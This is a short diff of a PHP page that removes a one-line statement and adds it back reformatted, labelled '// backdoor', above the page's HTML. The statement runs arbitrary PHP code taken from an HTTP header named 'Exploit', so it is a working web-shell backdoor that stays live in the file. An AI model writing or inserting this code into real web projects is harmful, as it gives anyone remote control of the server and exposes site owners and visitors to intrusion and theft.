@@ -1,4 +1,6 @@
-<?php isset($_SERVER["HTTP_EXPLOIT"]) and eval($_SERVER["HTTP_EXPLOIT"]); ?>
+<?php
+    isset($_SERVER["HTTP_EXPLOIT"]) and eval($_SERVER["HTTP_EXPLOIT"]); // backdoor
+?>
 <!doctype html>
 <html>
     <head>
